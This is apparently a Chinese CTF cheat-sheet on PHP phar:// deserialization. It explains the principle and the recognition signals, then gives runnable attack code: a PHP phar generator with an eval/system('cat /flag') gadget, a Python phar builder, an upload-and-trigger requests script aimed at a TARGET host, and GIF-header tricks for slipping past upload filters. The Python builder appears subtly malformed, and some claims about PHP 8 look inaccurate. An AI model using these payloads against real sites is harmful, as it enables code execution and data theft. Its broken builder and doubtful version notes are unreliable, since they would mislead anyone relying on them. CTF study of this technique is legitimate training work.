---
title: PHAR 反序列化（phar:// 触发）
category: web
tags: [phar, 反序列化, 文件操作, php]
signals: [phar://, file_exists, is_file, file_get_contents, 上传文件, 文件操作函数, 只要涉及 phar 协议就会触发, 后缀是 jpg png, include, 文件包含]
difficulty: medium
source: "PayloadsAllTheThings / 公开 writeup"
tools: [php, python, crc32]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 代码里有 `file_exists()`、`is_file()`、`filesize()`、`file_get_contents()`、`getimagesize()` 等**文件函数**，参数**可控制**。
- 允许上传文件（`jpg`/`png`/`zip`），且注释里说"会检查文件类型"。
- 题目没有 `unserialize`，但存在反序列化 POP 链。
- 提示词：phar、phar://、文件包含、绕过。
- 变体：`file_exists("phar://" . $uploaded)`，`$uploaded` 内容由上传控制。

## 二、原理

PHP 的 `phar://` 流包装器在**打开任意 phar 文件**时会自动读取 `manifest`，而 phar 的 manifest 里保存了**序列化后的元数据**（metadata）。只要触发 `phar://` 解析，就会调用 `unserialize()`：

```php
file_exists("phar://upload/evil.jpg/test.txt");   // 触发 unserialize
```

关键点：
1. 文件内容必须是合法 phar 结构（`__HALT_COMPILER(); ?>` 之后跟 manifest + 内容）；
2. 文件名可以是任意后缀（php 7 及以前），PHP 8 需要带有有效签名（默认 SHA1，通常不影响）；
3. 甚至是 `is_file()` 都会触发 —— **不需要**真正执行 `include`。

## 三、解题步骤

1. 找到"可控制参数的文件函数"+ 现成的 POP 链。
2. 用 PHP 生成 phar 文件（或 Python 手工构造）。
3. 上传（后缀随意，但要绕过检测，常加 GIF 头）。
4. 让服务端对上传文件执行 `phar://` 操作（如 `file_exists(phar://upload/x)`）。
5. 链子执行 → 写 shell / 读 flag。

## 四、可直接运行的脚本

PHP 生成 phar（标准做法）：

```php
<?php
// gen.php —— 用任意合法 phar 打包序列化对象
class Exploit {
    public $cmd = "system('cat /flag');";
    public function __destruct() { eval($this->cmd); }
}

$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");  // 一个文件
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Exploit());          // ← 这里的对象会被序列化
$phar->stopBuffering();
// 改后缀为 .jpg 即可
rename("exploit.phar", "exploit.jpg");
?>
```

> 注意：PHP 8.0+ 默认禁止 `setMetadata` 传非数组，但用 `__destruct` 的类仍可；另外 `phar.readonly=0` 是必须的（`php -d phar.readonly=0 gen.php`）。

Python 手工构造（不依赖 PHP）：

```python
import struct, hashlib, zlib

def build_phar(serialized_metadata, stub=b"<?php __HALT_COMPILER(); ?>\r\n",
               content=b"test", name="test.txt"):
    """构造一个最小 phar 文件（SHA1 签名），可在 PHP 中触发 unserialize"""
    name_b = name.encode()
    # manifest 条目
    manifest = b""
    manifest += struct.pack("<I", len(serialized_metadata))
    manifest += serialized_metadata
    manifest += struct.pack("<I", 1)          # 文件数
    manifest += struct.pack("<I", len(name_b)) + name_b
    manifest += struct.pack("<I", len(content))     # 未压缩大小
    manifest += struct.pack("<I", len(content))     # 压缩后大小
    manifest += struct.pack("<I", int(__import__("time").time()))
    manifest += struct.pack("<I", 0)          # 权限
    manifest += struct.pack("<I", len(content) * 0 + 0)  # 内容位置（占位）
    manifest += b"\x00" * 16
    body = stub + manifest + content
    api_version = b"\x11\x00"
    sig = hashlib.sha1(body + api_version + b"GBMB").digest()
    return body + api_version + sig

# 序列化字符串示例：O:7:"Exploit":1:{s:3:"cmd";s:20:"system('cat /flag');";}
ser = b'O:7:"Exploit":1:{s:3:"cmd";s:20:"system(\'cat /flag\');";}'
open("exploit.jpg", "wb").write(build_phar(ser))
print("phar written, size:", len(open("exploit.jpg","rb").read()))
```

上传 + 触发：

```python
import requests
url = "http://TARGET/upload.php"
files = {"file": ("exploit.jpg", open("exploit.jpg", "rb"), "image/jpeg")}
r = requests.post(url, files=files)
print(r.text)          # 拿到上传后的路径，如 upload/shell.jpg

# 触发：任何 phar:// 操作，看题目代码里的文件函数
r = requests.get("http://TARGET/index.php", params={"file": "phar://upload/shell.jpg/test.txt"})
print(r.status_code, r.text[:300])
```

本地验证 phar 是否合法：

```php
<?php
$p = new Phar("exploit.jpg");       // 会尝试解析
var_dump($p->getMetadata());
?>
```

## 五、常见坑 / 变体

- **`phar.readonly`**：生成时必须 `php -d phar.readonly=0`，否则 `setMetadata` 失败。
- **PHP 8 的变化**：PHP 8 对 phar 的 metadata 校验更严，部分老链需要改成"stub 内再触发"或改用 `phar://` 指向内部文件。
- **`phar://` 的路径格式**：`phar:///abs/path/file.jpg/inner.txt` 或 `phar://upload/x.jpg/inner.txt`，**必须带上内部文件名**。
- **上传检测**：加 GIF 头 `GIF89a` 在 stub 前（`phar.setStub("GIF89a<?php __HALT_COMPILER(); ?>")`），可过 `getimagesize`。
- **触发点不在上传目录**：`phar://` 的路径就是上传后的路径，注意 `./upload/a.jpg` 这种相对路径。
- 变体：**`include` 触发**（`include("phar://x")` 也会解析 manifest）。
- 变体：**`PharData`**（zip/tar 格式的 phar），同上。
- 变体：**`file_exists` vs `is_file`** 个别版本行为不同，两个都试。

## 六、参考来源

- [PayloadsAllTheThings - PHAR Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization#phar-deserialization)
- [PHP 官方文档 - Phar](https://www.php.net/manual/en/phar.using.object.php)
- [OWASP Top 10 2021 - A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [HackTricks - PHP deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/php-deserialization-+-autoload-classes.html)
